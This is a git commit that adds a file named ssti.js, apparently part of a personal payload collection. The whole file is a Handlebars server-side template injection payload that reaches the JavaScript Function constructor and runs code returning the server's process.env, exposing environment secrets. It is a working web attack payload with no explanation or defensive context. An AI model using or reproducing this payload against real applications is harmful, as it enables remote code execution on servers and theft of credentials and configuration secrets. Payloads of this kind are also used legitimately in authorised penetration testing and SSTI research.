948c23c89f2a9260656d95e64d7409891e98bf34
RhyRu9 <164749781+RHYru9@users.noreply.github.com>
2024-12-09 23:59:14 +0700

    Create ssti.js

---
+++ js/ssti.js
@@ -0,0 +1,19 @@
+{{#with "hola" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return JSON.stringify(process.env);"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
